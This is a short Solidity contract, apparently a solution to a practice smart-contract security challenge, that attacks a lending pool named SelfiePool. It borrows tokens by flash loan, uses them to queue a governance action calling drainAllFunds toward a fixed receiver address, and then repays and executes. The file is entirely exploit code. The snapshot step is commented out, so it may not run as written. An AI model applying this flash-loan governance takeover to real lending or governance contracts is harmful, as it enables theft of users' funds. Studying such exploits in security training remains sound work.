pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "hardhat/console.sol";

contract HackSelfie {
    ISelfiePool pool = ISelfiePool(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
    ISimpleGovernance gov =
        ISimpleGovernance(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    uint256 actionId;

    function callFlashLoan(uint256 amount) public {
        pool.flashLoan(amount);
        gov.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) public {
        //ERC20Snapshot(token).snapshot();

        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                0x70997970C51812dc3A010C7d01b50e0d17dc79C8
            ),
            0
        );
        console.log("actionId", actionId);
        ERC20Snapshot(token).transfer(address(pool), amount);
    }
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}
